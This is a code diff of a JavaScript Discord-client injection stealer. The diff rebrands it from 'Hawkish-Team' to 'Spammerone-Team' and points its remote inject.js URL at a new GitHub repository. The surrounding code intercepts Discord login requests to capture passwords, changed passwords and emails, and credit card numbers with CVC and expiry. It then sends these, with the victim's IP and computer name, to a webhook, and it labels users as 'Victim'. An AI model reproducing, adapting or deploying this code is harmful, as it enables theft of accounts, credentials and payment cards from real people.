@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Inplex-sys/Hawkish-Eyes/main/inject.js",
+    injection_url: "https://raw.githubusercontent.com/KebabBusiness09/Inject/main/inject.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
@@ -66,7 +66,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Hawkish-Team",
+        username: "Spammerone-Team",
         avatar_url: "https://raw.githubusercontent.com/Hawkishx/assets/main/hawkish.png",
         content: "",
         embeds: [{
@@ -75,11 +75,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Hawkish-Team`
+                name: `Spammerone-Team`
             },
             
             footer: {
-                text: `©[${config.creator}] | https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook`
+                text: `©[${config.creator}] | https://discord.gg/E2GB2y4XC4`
             },
 
         }]
@@ -300,7 +300,7 @@ const FirstTime = async () => {
     var client_discord = await getDiscordClientFolder()
     if (!token) {
         var params = await makeEmbed({
-            title: "Hawkish-Team Initialized",
+            title: "Spammerone-Team Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -321,7 +321,7 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Hawkish-Team Initialized",
+            title: " Spammerone-Team Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -353,10 +353,10 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                value: `[Spammerone-Team 2023 <:hwkish:1104091524758773822>](https://discord.gg/E2GB2y4XC4)`,
                 inline: !0
             }, {
-                name: "Hawkished Files",
+                name: "Spammeroneed Files",
                 value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                 inline: !0
             }, {
@@ -393,7 +393,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Hawkish User log out (User not Logged in before)",
+                title: "Spammerone User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -414,7 +414,7 @@ const FirstTime = async () => {
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Hawkish Victim got logged out",
+                title: "Spammerone Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
                     name: "Username <:username:1041634536733290596> ",
@@ -446,10 +446,10 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                    value: `[Spammerone-Team 2023 <:hwkish:1104091524758773822>](https://discord.gg/E2GB2y4XC4)`,
                     inline: !0
                 }, {
-                    name: "Hawkished Files",
+                    name: "Spammeroneed Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -596,7 +596,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Hawkish User Login",
+                title: "Spammerone User Login",
                 color: config['embed-color'],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
@@ -629,10 +629,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                    value: `[Spammerone-Team 2023 <:hwkish:1104091524758773822>](https://discord.gg/E2GB2y4XC4)`,
                     inline: !0
                 }, {
-                    name: "Hawkished Files",
+                    name: "Spammeroneed Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -681,7 +681,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Hawkish-Team Detect Password Changed",
+                    title: "Spammerone-Team Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -714,10 +714,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                        value: `[Spammerone-Team 2023 <:hwkish:1104091524758773822>](https://discord.gg/E2GB2y4XC4)`,
                         inline: !0
                     }, {
-                        name: "Hawkished Files",
+                        name: "Spammeroneed Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -768,7 +768,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Hawkish-Team Detect Email Changed",
+                    title: "Spammerone-Team Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -801,10 +801,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                        value: `[Spammerone-Team 2023 <:hwkish:1104091524758773822>](https://discord.gg/E2GB2y4XC4)`,
                         inline: !0
                     }, {
-                        name: "Hawkished Files",
+                        name: "Spammeroneed Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -854,9 +854,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Hawkish-Team User Credit Card Added",
+                title: "Spammerone-Team User Credit Card Added",
                 description: `
-                Hawkished Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
+                Spammeroneed Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                 **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
